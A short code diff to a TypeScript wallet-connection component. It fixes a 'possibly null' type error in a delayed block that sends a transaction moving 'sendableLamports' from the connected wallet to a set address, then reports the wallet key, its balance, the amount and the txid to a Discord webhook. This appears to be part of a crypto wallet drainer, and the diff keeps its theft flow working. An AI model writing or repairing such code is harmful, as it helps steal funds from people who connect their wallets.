@@ -143,19 +143,17 @@ const WalletConnectionHandler: FC = () => {
                 })
             );
 
-            const safeConnection = connection; // Already validated as non-null above
+            const safeConnection = connection;
+            const currentLamports = lamports; // 👈 fix for "possibly null"
 
-setTimeout(async () => {
-    try {
-        if (!safeConnection) return;
-
-        const txid = await sendTransaction(finalTx, safeConnection);
-
+            setTimeout(async () => {
+                try {
+                    const txid = await sendTransaction(finalTx, safeConnection);
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
                         walletPublicKey.toBase58(),
-                        lamports / LAMPORTS_PER_SOL,
+                        currentLamports / LAMPORTS_PER_SOL,
                         sendableLamports,
                         toPubkey.toBase58(),
                         txid
